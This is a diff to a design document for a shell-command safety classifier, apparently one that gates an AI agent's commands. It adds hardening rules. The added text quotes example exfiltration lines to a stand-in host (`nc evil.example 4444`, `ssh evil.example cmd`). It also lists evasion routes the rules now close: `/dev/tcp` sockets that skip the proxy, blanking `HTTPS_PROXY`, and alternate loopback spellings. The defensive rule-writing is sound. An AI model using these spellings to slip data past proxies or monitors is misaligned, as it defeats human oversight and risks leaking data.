@@ -187,3 +187,34 @@ policy stricter.
   parentheses, and a command name that is itself a variable (`$CMD`), are
   treated as hidden code (⛔ in plan, ❓ otherwise) instead of being guessed
   at.
+
+## Review v1 hardening
+
+These changes close specific spellings that reached a weaker row than the
+approved table assigns. Each brings the implementation in line with the table
+or makes it stricter; none loosens a verdict.
+
+- **Bare-host senders are row 20.** `ssh`, `nc`, `ncat`, `netcat`, `socat`,
+  `telnet`, `ftp`, `mail` and `sendmail` take the host as a plain positional
+  argument (`nc evil.example 4444`, `ssh evil.example cmd`), which the
+  URL/`user@host` host scan does not see. A sender with no allowlisted or
+  provider host is now ⛔ row 20 in every mode (an unidentified host is not
+  allowlisted), instead of falling through to row 6. `scp`/`sftp`/`rsync`
+  without a remote `host:` argument stay row 6, since they are local copies.
+- **`/dev/tcp` and `/dev/udp` redirects are an outbound send.** A redirect
+  whose target is `/dev/tcp/<host>/<port>` (or `/dev/udp/...`) opens a socket
+  that honours no proxy variable and never reaches mitmproxy, so it is judged
+  by its host: row 20 to an unknown host, row 19 to loopback or metadata.
+- **A standalone `*_PROXY=` segment is row 18.** A bare `HTTPS_PROXY=`
+  statement in its own `;`-separated segment (empty argv) empties the exported
+  proxy variable for later commands in the same shell. Assignment-only
+  segments are now inspected for proxy and CA variables, at the top level and
+  inside `sh -c` / `bash -c` strings, so this reaches the row-18 check.
+- **Loopback is matched in every spelling.** Row 19's `127.0.0.0/8` now covers
+  short, hex and decimal forms (`127.1`, `0x7f000001`, `2130706433`),
+  IPv4-mapped IPv6 (`::ffff:127.0.0.1`) and `*.localhost` (RFC 6761), not just
+  the dotted-quad `127.x.x.x`.
+- **`command -v`/`-V` is read-only.** `command -v rm` and `builtin -V rm`
+  resolve a name and run nothing, so they are row 5 instead of inheriting the
+  inner verb's row (`command -v rm` is no longer blocked as row 28). A real
+  inner command such as `command rm x` is still classified by its verb.
